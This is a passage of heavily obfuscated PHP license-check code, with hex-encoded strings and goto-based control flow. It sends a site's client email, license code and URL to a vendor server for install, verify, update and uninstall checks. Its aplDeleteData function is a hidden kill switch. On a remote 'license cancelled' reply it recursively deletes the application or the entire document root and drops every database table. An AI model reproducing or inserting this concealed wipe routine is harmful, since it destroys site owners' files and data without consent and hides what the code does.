JXqIa; } echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR; exit; JXqIa: @fclose($handle); vg36O: fkL6f: goto CZ7nl; fn9te: $notifications_array["\x6e\157\164\x69\146\x69\x63\141\x74\151\157\156\x5f\x63\141\x73\x65"] = "\156\157\x74\x69\x66\151\x63\x61\x74\151\x6f\x6e\x5f\141\x6c\162\145\141\144\x79\x5f\x69\156\163\164\x61\x6c\154\x65\144"; $notifications_array["\x6e\x6f\x74\x69\x66\x69\143\x61\164\151\157\x6e\137\164\x65\x78\x74"] = APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED; CZ7nl: Ydvmv: return $notifications_array; } function preparePackageInstallation($installable) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (!empty($apl_core_notifications)) { goto Tzk8o; } $MYSQLI_LINK = getMysqliConnection(); $core_license = aplGetLicenseData($MYSQLI_LINK); if (!(empty($core_license) || !is_array($core_license))) { goto eTv1W; } throw new \Exception("\103\157\162\x65\x20\163\143\162\151\x70\164\x20\x6c\151\143\145\x6e\163\x65\x20" . "\166\141\154\151\144\x61\164\151\x6f\x6e" . "\40\146\x61\151\x6c\145\x64\41\x20\x50\x6c\x65\x61\163\145\40\x63\157\x6e\164\x61\143\x74" . "\40\x73\165\160\160\157\x72\164\x20\146\x6f\x72\x20\150\145\x6c\x70\56"); eTv1W: $CLIENT_EMAIL = $core_license["\103\x4c\111\105\116\x54\137\105\115\101\x49\x4c"]; $LICENSE_CODE = $installable["\154\x69\x63\x65\x6e\163\x65\137\x6b\x65\x79"]; $ROOT_URL = config("\141\160\160\x2e\165\x72\154"); $INSTALLATION_HASH = hash("\x73\150\x61\x32\x35\66", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE); $post_info = "\160\x72\157\144\x75\143\164\137\x69\144\x3d" . rawurlencode($installable["\x69\x64"]) . "\x26\x63\154\x69\145\x6e\x74\x5f\x65\x6d\141\x69\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\151\x63\145\156\x73\x65\137\x63\157\144\x65\x3d" . rawurlencode($LICENSE_CODE) . "\46\162\157\157\x74\137\165\162\154\x3d" . rawurlencode($ROOT_URL) . "\46\151\x6e\163\164\x61\154\x6c\x61\164\151\157\x6e\137\x68\x61\163\x68\75" . rawurlencode($INSTALLATION_HASH) . "\46\x6c\151\x63\x65\x6e\163\x65\x5f\163\x69\147\156\x61\164\165\162\145\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\151\144"])); $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\154\137\143\141\154\x6c\142\141\x63\153\163\x2f\154\151\x63\145\156\x73\145\x5f\151\x6e\163\164\141\154\154\x2e\x70\150\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\x69\144"]); if ($notifications_array["\x6e\x6f\164\x69\146\x69\143\141\164\151\157\x6e\137\143\x61\x73\x65"] == "\156\x6f\x74\x69\146\151\143\x61\164\151\157\156\x5f\154\151\x63\145\x6e\x73\145\x5f\157\x6b") { goto Mwtf2; } if (empty($notifications_array["\x6e\157\164\151\x66\151\143\141\164\151\157\x6e\x5f\x74\145\x78\164"])) { goto qHkAo; } throw new \Exception("\114\151\x63\145\156\x73\x65\x20" . "\x76\141\x6c\x69\x64\141\164\x69\x6f\x6e" . "\40\x66\141\151\154\145\x64\41\40" . $notifications_array["\156\157\x74\151\146\x69\143\x61\164\x69\157\156\x5f\164\145\170\x74"]); qHkAo: goto kYS02; Mwtf2: $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\x59\55\x6d\55\144"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL); $LCD = aplCustomEncrypt(date("\131\x2d\155\x2d\x64", strtotime("\x2d" . APL_DAYS . "\40\144\x61\x79\x73")), APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomEncrypt(date("\131\x2d\x6d\x2d\x64"), APL_SALT . $INSTALLATION_KEY); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\x70\154\137\143\x61\x6c\154\142\x61\143\x6b\x73\x2f\x6c\151\x63\x65\x6e\x73\145\137\163\x63\x68\145\155\x65\x2e\160\x68\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\x69\x64"]); if (!(!empty($notifications_array["\x6e\x6f\164\151\x66\151\x63\141\164\x69\157\156\137\144\x61\x74\141"]) && !empty($notifications_array["\x6e\x6f\x74\151\x66\151\143\x61\x74\151\157\x6e\137\144\141\x74\141"]["\x73\143\150\145\x6d\145\137\161\x75\145\162\x79"]))) { goto OjYUU; } return ["\151\156\163\164\x61\154\154\x61\164\151\157\156\x5f\153\145\171" => $INSTALLATION_KEY, "\151\x6e\x73\164\141\x6c\x6c\141\x74\151\157\156\x5f\x68\x61\x73\x68" => $INSTALLATION_HASH, "\x6c\x63\x64" => $LCD, "\154\x72\144" => $LRD]; OjYUU: kYS02: Tzk8o: throw new \Exception("\114\x69\143\145\156\x73\145\40" . "\166\x61\154\x69\144\141\x74\151\157\x6e" . "\x20\x66\x61\x69\154\145\x64\41\x20\120\x6c\145\141\163\145\40\143\x6f\x6e\x74\x61\x63\164" . "\40\163\x75\x70\160\157\162\x74\40\146\157\162\40\x68\x65\154\160\x2e"); } function incevioAutoloadHelpers($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0) { $notifications_array = array(); $update_lrd_value = 0; $update_lcd_value = 0; $updated_records = 0; $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto S5O0w; } $notifications_array["\156\x6f\164\x69\x66\x69\x63\x61\x74\151\x6f\x6e\x5f\143\x61\163\x65"] = "\x6e\157\164\x69\x66\x69\143\141\x74\151\157\156\x5f\x73\143\162\x69\x70\164\x5f\143\x6f\x72\162\x75\x70\x74\145\x64"; $notifications_array["\x6e\x6f\x74\x69\x66\151\143\141\x74\151\157\156\137\164\145\x78\164"] = implode("\73\40", $apl_core_notifications); goto h6sQd; S5O0w: if (aplCheckData($MYSQLI_LINK)) { goto oW_FW; } $notifications_array["\156\157\164\151\146\x69\143\141\164\x69\x6f\156\137\143\141\x73\145"] = "\x6e\157\x74\151\146\x69\x63\x61\164\151\157\x6e\137\154\x69\143\x65\156\x73\145\x5f\143\157\162\162\x75\x70\x74\145\x64"; $notifications_array["\156\x6f\x74\151\x66\x69\143\x61\x74\151\x6f\x6e\137\164\x65\170\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto HzP4m; oW_FW: extract(aplGetLicenseData($MYSQLI_LINK)); if (aplGetDaysBetweenDates(aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY), date("\x59\55\155\x2d\x64")) < APL_DAYS && aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY) <= date("\131\x2d\155\x2d\144") && aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) <= date("\x59\x2d\x6d\55\144") && $FORCE_VERIFICATION === 0) { goto jY5zr; } $post_info = "\x70\162\157\x64\x75\143\x74\x5f\151\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\x6c\151\145\156\x74\x5f\x65\x6d\141\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\x26\154\x69\143\145\156\x73\x65\x5f\x63\157\144\145\x3d" . rawurlencode($LICENSE_CODE) . "\x26\162\157\x6f\x74\x5f\165\162\x6c\75" . rawurlencode($ROOT_URL) . "\x26\x69\156\x73\164\141\x6c\154\141\x74\x69\x6f\156\137\150\141\x73\x68\75" . rawurlencode($INSTALLATION_HASH) . "\46\154\151\x63\145\156\x73\145\x5f\x73\x69\147\156\x61\164\165\x72\x65\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\141\160\154\137\143\x61\154\x6c\142\141\x63\153\x73\x2f\x6c\x69\143\x65\x6e\163\145\137\x76\x65\162\x69\146\171\x2e\160\150\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!($notifications_array["\x6e\x6f\164\x69\146\x69\x63\141\x74\151\x6f\156\x5f\x63\141\x73\145"] == "\x6e\157\x74\x69\x66\x69\143\x61\164\x69\x6f\x6e\x5f\154\151\143\145\156\x73\145\137\157\x6b")) { goto r2ZR7; } $update_lcd_value = 1; r2ZR7: if (!($notifications_array["\x6e\x6f\164\x69\x66\151\143\x61\164\151\x6f\156\x5f\143\141\x73\x65"] == "\x6e\157\164\x69\146\x69\143\x61\164\x69\157\156\137\154\151\143\x65\156\163\145\137\x63\141\x6e\143\145\x6c\x6c\x65\x64" && APL_DELETE_CANCELLED == "\131\105\x53")) { goto fFcIu; } aplDeleteData($MYSQLI_LINK); fFcIu: goto p0jdO; jY5zr: $notifications_array["\156\x6f\x74\151\146\x69\143\141\164\151\x6f\x6e\137\x63\x61\x73\145"] = "\x6e\157\x74\151\x66\x69\x63\141\x74\151\157\x6e\137\x6c\151\143\x65\156\x73\x65\137\157\153"; $notifications_array["\x6e\157\164\151\x66\x69\x63\141\x74\x69\x6f\156\x5f\164\x65\170\x74"] = APL_NOTIFICATION_BYPASS_VERIFICATION; p0jdO: if (!(aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) < date("\131\x2d\x6d\x2d\x64"))) { goto Oskl_; } $update_lrd_value = 1; Oskl_: if (!($update_lrd_value == 1 || $update_lcd_value == 1)) { goto hFDuQ; } if ($update_lcd_value == 1) { goto L4bsT; } $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY); goto bHj9z; L4bsT: $LCD = date("\x59\x2d\x6d\55\x64"); bHj9z: $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\131\x2d\155\55\x64"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL); $LCD = aplCustomEncrypt($LCD, APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomEncrypt(date("\x59\x2d\x6d\x2d\x64"), APL_SALT . $INSTALLATION_KEY); if (!(APL_STORAGE == "\104\x41\124\x41\102\101\123\105")) { goto S1EXJ; } $stmt = mysqli_prepare($MYSQLI_LINK, "\x55\x50\104\x41\x54\105\40" . APL_DATABASE_TABLE . "\x20\x53\x45\124\40\114\103\104\75\x3f\x2c\40\114\122\104\x3d\77\54\40\111\x4e\x53\124\x41\114\x4c\x41\124\x49\x4f\116\137\x4b\x45\131\x3d\77"); if (!$stmt) { goto umDaN; } mysqli_stmt_bind_param($stmt, "\x73\x73\163", $LCD, $LRD, $INSTALLATION_KEY); $exec = mysqli_stmt_execute($stmt); $affected_rows = mysqli_stmt_affected_rows($stmt); if (!($affected_rows > 0)) { goto XBgct; } $updated_records = $updated_records + $affected_rows; XBgct: mysqli_stmt_close($stmt); umDaN: if (!($updated_records < 1)) { goto bB5oT; } echo APL_NOTIFICATION_DATABASE_WRITE_ERROR; exit; bB5oT: S1EXJ: if (!(APL_STORAGE == "\106\111\x4c\x45")) { goto OPJws; } $handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\167\53"); $fwrite = @fwrite($handle, "\x3c\122\x4f\x4f\x54\137\x55\122\x4c\76{$ROOT_URL}\74\x2f\x52\117\117\124\137\x55\x52\x4c\76\x3c\x43\x4c\x49\105\x4e\124\x5f\x45\x4d\x41\111\x4c\x3e{$CLIENT_EMAIL}\74\57\x43\x4c\111\x45\116\124\137\x45\115\x41\x49\x4c\x3e\x3c\x4c\x49\103\105\116\x53\x45\x5f\103\x4f\x44\x45\76{$LICENSE_CODE}\74\57\114\x49\103\105\116\x53\105\x5f\x43\117\104\x45\x3e\74\x4c\x43\104\76{$LCD}\x3c\x2f\114\x43\x44\x3e\x3c\114\122\x44\76{$LRD}\74\57\x4c\122\104\76\74\x49\116\123\124\x41\x4c\114\101\x54\111\117\116\x5f\x4b\105\131\x3e{$INSTALLATION_KEY}\x3c\57\111\116\123\x54\x41\x4c\x4c\101\124\x49\x4f\x4e\137\113\105\131\76\74\x49\x4e\x53\124\x41\114\x4c\101\x54\x49\x4f\x4e\137\110\x41\x53\x48\76{$INSTALLATION_HASH}\x3c\x2f\111\116\123\124\101\114\114\x41\124\x49\117\116\x5f\x48\101\x53\110\x3e"); if (!($fwrite === false)) { goto BnoX5; } echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR; exit; BnoX5: @fclose($handle); OPJws: hFDuQ: HzP4m: h6sQd: if (!($notifications_array["\x6e\x6f\164\x69\146\151\143\141\x74\x69\157\x6e\137\143\141\163\145"] != "\x6e\157\x74\151\x66\151\143\141\x74\x69\x6f\156\137\154\151\x63\x65\156\x73\145\x5f\157\x6b")) { goto BHRur; } echo "\74\142\162\57\x3e\74\x62\162\57\x3e"; echo "\114\x69\143\x65\x6e\x73\145\x20\x69\x73\x20\x6e\157\x74" . "\x20\x69\x6e\163\x74\141\154\x6c\145\144\x20\x79\145\164" . "\x20\x6f\162\40\x63\x6f\x72\x72\165\x70\164\x65\144\x2e\x20\120\x6c\145\141\x73\x65" . "\40\143\157\156\x74\141\143\x74" . "\40\x73\x75\160\160\157\162\164\x20" . "\164\x65\x61\155\40"; echo "\40\74\141\40\x68\162\x65\x66\75\x22" . route("\x61\144\x6d\151\156\x2e\x73\145\164\x74\151\x6e\x67\56\x6c\151\x63\x65\x6e\x73\145\x2e\x75\x70\144\141\164\x65") . "\x22\x3e" . trans("\x61\x70\160\56\x75\x70\144\141\164\145\x5f\141\160\x70\137\154\x69\143\145\x6e\x73\x65") . "\74\x2f\141\x3e"; exit; BHRur: return $notifications_array; } function aplVerifySupport($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto ClaT0; } $notifications_array["\156\x6f\164\x69\x66\151\x63\141\164\151\157\156\137\143\x61\x73\x65"] = "\x6e\157\x74\151\146\x69\x63\x61\x74\151\157\156\137\163\x63\x72\151\160\164\x5f\x63\x6f\162\162\x75\160\164\145\144"; $notifications_array["\156\x6f\x74\151\x66\x69\x63\x61\x74\151\157\x6e\137\164\145\170\164"] = implode("\x3b\x20", $apl_core_notifications); goto IpkrL; ClaT0: if (aplCheckData($MYSQLI_LINK)) { goto VIiI8; } $notifications_array["\156\x6f\164\151\x66\x69\143\141\164\151\157\156\x5f\x63\x61\x73\145"] = "\x6e\157\164\x69\x66\x69\x63\141\x74\151\x6f\x6e\x5f\x6c\151\143\145\x6e\x73\x65\x5f\x63\x6f\162\162\x75\x70\x74\145\x64"; $notifications_array["\x6e\x6f\x74\x69\x66\x69\x63\x61\x74\x69\157\x6e\x5f\x74\x65\x78\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto scUCL; VIiI8: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\160\162\x6f\x64\165\x63\x74\137\x69\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\143\154\151\145\x6e\x74\137\145\155\141\151\x6c\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\151\143\145\156\x73\145\137\x63\157\x64\x65\x3d" . rawurlencode($LICENSE_CODE) . "\x26\x72\x6f\157\x74\137\165\162\154\75" . rawurlencode($ROOT_URL) . "\46\151\156\x73\x74\x61\154\154\x61\164\x69\157\x6e\x5f\x68\x61\x73\150\75" . rawurlencode($INSTALLATION_HASH) . "\46\x6c\151\143\145\x6e\x73\145\137\x73\x69\x67\x6e\141\x74\165\x72\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\x61\x70\x6c\x5f\x63\141\x6c\154\x62\x61\143\153\163\57\x6c\x69\x63\145\x6e\163\145\x5f\163\x75\160\x70\157\x72\x74\56\x70\x68\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); scUCL: IpkrL: return $notifications_array; } function aplVerifyUpdates($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto W8W5I; } $notifications_array["\x6e\x6f\164\151\146\x69\x63\141\x74\151\x6f\x6e\137\143\x61\x73\x65"] = "\x6e\157\164\151\146\151\x63\141\164\151\x6f\156\x5f\163\x63\162\x69\x70\x74\137\143\157\x72\x72\x75\x70\164\145\x64"; $notifications_array["\156\157\164\151\146\x69\143\141\164\x69\x6f\x6e\137\164\145\x78\164"] = implode("\x3b\40", $apl_core_notifications); goto d7zQa; W8W5I: if (aplCheckData($MYSQLI_LINK)) { goto TaZXl; } $notifications_array["\x6e\x6f\164\x69\x66\151\x63\x61\164\151\157\156\x5f\143\141\163\x65"] = "\156\x6f\x74\151\146\151\x63\x61\164\x69\x6f\156\x5f\x6c\x69\x63\145\x6e\163\x65\137\143\x6f\162\x72\x75\x70\164\145\144"; $notifications_array["\156\x6f\x74\151\x66\x69\x63\x61\164\151\157\156\137\164\x65\x78\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto RPCKF; TaZXl: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\160\162\x6f\x64\x75\x63\164\x5f\151\144\75" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\154\x69\x65\x6e\164\x5f\x65\155\x61\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\x26\x6c\x69\143\145\x6e\x73\x65\x5f\143\x6f\x64\x65\75" . rawurlencode($LICENSE_CODE) . "\x26\162\157\157\164\137\x75\162\154\75" . rawurlencode($ROOT_URL) . "\x26\151\x6e\163\164\x61\x6c\x6c\x61\x74\151\x6f\156\137\150\x61\x73\x68\75" . rawurlencode($INSTALLATION_HASH) . "\x26\x6c\151\143\x65\x6e\x73\145\x5f\163\151\x67\156\141\164\x75\162\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\x6c\137\x63\141\154\x6c\x62\141\143\x6b\163\57\x6c\151\x63\145\x6e\x73\x65\x5f\165\x70\144\141\164\145\x73\x2e\160\x68\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); RPCKF: d7zQa: return $notifications_array; } function incevioUpdateLicense($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto X0Vap; } $notifications_array["\x6e\157\x74\151\x66\x69\x63\141\164\151\x6f\156\x5f\143\141\x73\x65"] = "\156\x6f\164\151\x66\151\143\x61\x74\151\157\156\x5f\163\x63\162\x69\x70\164\x5f\143\x6f\x72\x72\x75\x70\164\x65\x64"; $notifications_array["\x6e\157\164\151\146\151\x63\141\164\x69\x6f\156\x5f\164\145\170\164"] = implode("\73\x20", $apl_core_notifications); goto kqL22; X0Vap: if (aplCheckData($MYSQLI_LINK)) { goto CL7Of; } $notifications_array["\x6e\157\164\x69\x66\151\x63\x61\x74\x69\157\x6e\137\143\141\x73\x65"] = "\156\x6f\164\151\x66\x69\x63\x61\164\x69\157\156\137\154\151\143\145\156\x73\x65\x5f\143\157\x72\x72\x75\160\164\x65\144"; $notifications_array["\x6e\157\164\151\x66\151\143\x61\164\151\x6f\x6e\137\164\145\x78\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto Wk07C; CL7Of: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\160\162\157\144\x75\x63\x74\x5f\151\x64\75" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\154\x69\x65\x6e\164\137\x65\155\x61\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\143\145\x6e\x73\145\x5f\143\157\x64\x65\75" . rawurlencode($LICENSE_CODE) . "\x26\x72\157\x6f\164\137\165\x72\154\75" . rawurlencode($ROOT_URL) . "\x26\x69\x6e\163\x74\x61\x6c\x6c\141\164\x69\157\x6e\137\x68\141\163\150\75" . rawurlencode($INSTALLATION_HASH) . "\x26\x6c\x69\143\145\156\163\x65\x5f\x73\151\x67\156\141\x74\x75\x72\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\160\154\x5f\143\141\x6c\x6c\142\x61\143\153\163\x2f\x6c\x69\x63\x65\x6e\x73\145\137\165\x70\x64\141\x74\145\x2e\160\x68\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); Wk07C: kqL22: return $notifications_array; } function incevioUninstallLicense($MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto zpez6; } $notifications_array["\156\157\x74\151\x66\151\x63\141\x74\151\157\156\137\143\x61\163\x65"] = "\x6e\157\164\151\146\x69\x63\141\164\x69\x6f\x6e\137\x73\143\162\x69\x70\x74\137\143\x6f\x72\x72\x75\160\x74\x65\144"; $notifications_array["\x6e\x6f\x74\x69\146\x69\143\x61\164\x69\x6f\156\x5f\164\145\x78\x74"] = implode("\x3b\x20", $apl_core_notifications); goto QM0UX; zpez6: if (aplCheckData($MYSQLI_LINK)) { goto MCOm4; } $notifications_array["\x6e\x6f\164\151\146\x69\143\141\164\x69\157\x6e\x5f\143\x61\163\145"] = "\x6e\157\164\x69\146\151\143\141\164\x69\157\x6e\137\154\x69\143\x65\x6e\x73\145\137\143\157\x72\x72\165\160\x74\x65\144"; $notifications_array["\156\x6f\164\x69\146\151\x63\x61\164\x69\157\156\137\x74\145\x78\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED; goto uNZCs; MCOm4: extract(aplGetLicenseData($MYSQLI_LINK)); $post_info = "\160\162\x6f\x64\165\143\164\x5f\x69\x64\75" . rawurlencode(APL_PRODUCT_ID) . "\46\143\x6c\151\x65\156\x74\137\145\155\141\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\x26\154\x69\143\145\156\163\x65\x5f\143\x6f\144\x65\75" . rawurlencode($LICENSE_CODE) . "\46\162\x6f\157\x74\137\165\x72\154\x3d" . rawurlencode($ROOT_URL) . "\x26\x69\x6e\x73\164\141\154\154\x61\164\151\x6f\x6e\x5f\x68\x61\x73\150\75" . rawurlencode($INSTALLATION_HASH) . "\46\154\151\143\145\156\163\145\x5f\x73\x69\147\156\141\x74\165\162\145\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\160\x6c\137\x63\x61\154\x6c\x62\141\x63\153\163\57\x6c\x69\x63\x65\156\x73\145\137\165\x6e\151\x6e\163\164\141\x6c\x6c\x2e\160\150\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!($notifications_array["\156\157\x74\151\146\151\143\x61\x74\151\x6f\156\x5f\143\x61\x73\x65"] == "\x6e\x6f\164\151\146\x69\143\x61\164\151\x6f\156\137\x6c\151\143\x65\x6e\163\x65\x5f\x6f\x6b")) { goto oiAy3; } if (!(APL_STORAGE == "\x44\101\x54\101\102\x41\123\105")) { goto rh6HD; } mysqli_query($MYSQLI_LINK, "\104\x45\x4c\105\x54\105\x20\106\x52\117\x4d\x20" . APL_DATABASE_TABLE); mysqli_query($MYSQLI_LINK, "\x44\x52\117\120\40\x54\x41\x42\x4c\x45\x20" . APL_DATABASE_TABLE); rh6HD: if (!(APL_STORAGE == "\x46\111\114\x45")) { goto vQRA0; } $handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\x77\53"); @fclose($handle); vQRA0: oiAy3: uNZCs: QM0UX: return $notifications_array; } function aplDeleteData($MYSQLI_LINK = null) { if (APL_GOD_MODE == "\131\105\x53" && isset($_SERVER["\104\117\x43\x55\x4d\105\x4e\124\137\122\x4f\x4f\x54"])) { goto nnYhz; } $root_directory = dirname(__DIR__); goto XJO6v; nnYhz: $root_directory = $_SERVER["\x44\x4f\103\125\115\x45\116\124\137\x52\117\x4f\124"]; XJO6v: foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) { $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname()); v1LVs: } Q_0dP: rmdir($root_directory); if (!(APL_STORAGE == "\104\x41\124\101\102\101\x53\x45")) { goto vxiD4; } $database_tables_array = array(); $table_list_results = mysqli_query($MYSQLI_LINK, "\123\110\x4f\x57\x20\124\x41\x42\114\105\123"); DnWC7: if (!($table_list_row = mysqli_fetch_row($table_list_results))) { goto YzMZf; } $database_tables_array[] = $table_list_row[0]; goto DnWC7; YzMZf: if (empty($database_tables_array)) { goto c67Md; } foreach ($database_tables_array as $table_name) { mysqli_query($MYSQLI_LINK, "\104\x45\114\x45\x54\105\40\106\x52\117\x4d\x20{$table_name}"); wBx3d: } cTqOA: foreach ($database_tables_array as $table_name) { mysqli_query($MYSQLI_LINK, "\x44\x52\117\x50\40\x54\x41\x42\114\x45\x20{$table_name}"); fDTNV: } cPUPT: c67Md: vxiD4: exit; }